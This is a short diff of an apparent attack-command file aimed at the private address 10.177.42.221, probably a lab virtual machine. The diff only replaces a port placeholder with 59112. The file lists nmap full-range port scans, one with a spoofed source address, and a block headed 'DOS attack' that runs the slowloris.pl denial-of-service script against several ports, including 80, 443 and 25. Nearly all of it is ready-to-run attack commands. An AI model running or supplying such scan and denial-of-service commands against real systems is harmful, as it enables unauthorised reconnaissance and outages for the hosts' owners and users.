@@ -4,7 +4,7 @@ nmap -Pn 10.177.42.221 -p 1-65535 -v
 sudo nmap -sS -S 127.0.0.1 10.177.42.221 -p 1-65535 -v
 
 # DOS attack
-perl slowloris.pl -dns 10.177.42.221 -port [SSH PORT VM]
+perl slowloris.pl -dns 10.177.42.221 -port 59112
 perl slowloris.pl -dns 10.177.42.221 -port 80
 perl slowloris.pl -dns 10.177.42.221 -port 443
 perl slowloris.pl -dns 10.177.42.221 -port 25
